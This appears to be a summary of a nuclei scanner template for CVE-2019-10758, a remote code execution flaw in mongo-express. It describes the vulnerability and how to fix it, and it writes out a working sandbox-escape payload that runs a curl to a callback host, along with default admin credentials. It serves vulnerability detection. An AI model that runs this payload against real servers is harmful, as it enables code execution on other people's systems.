---
cve_id: CVE-2019-10758
template_path: nuclei-templates/http/cves/2019/CVE-2019-10758.yaml
affected_product: mongo-express
severity: critical
authentication: required
external_callback: true
affected_versions: < 0.54.0
preconditions: []
poc_classification: rce
---

## Vulnerability
mongo-express before 0.54.0 is vulnerable to remote code execution via endpoints that use the `toBSON` method and misuse the `vm` dependency to perform `exec` commands in a non-safe environment.  
**Impact:** Successful exploitation allows an attacker to execute arbitrary code on the affected system.  
**Remediation:** Upgrade to version 0.54.0 or higher.  
**CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)  
**CPE:** cpe:2.3:a:mongo-express_project:mongo-express:*:*:*:*:*:node.js:*:*

## PoC / Detection
Classification: rce  
The template sends a single POST request to `/checkValid` with `Authorization: Basic YWRtaW46cGFzcw==` (admin:pass) and a form payload `document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl {{interactsh-url}}")`. It then matches on an HTTP interactsh-protocol callback to confirm the command executed.

## References
- https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758
- https://nvd.nist.gov/vuln/detail/CVE-2019-10758
- https://snyk.io/vuln/SNYK-JS-MONGOEXPRESS-473215
- https://github.com/CLincat/vulcat
- https://github.com/MelanyRoob/Goby
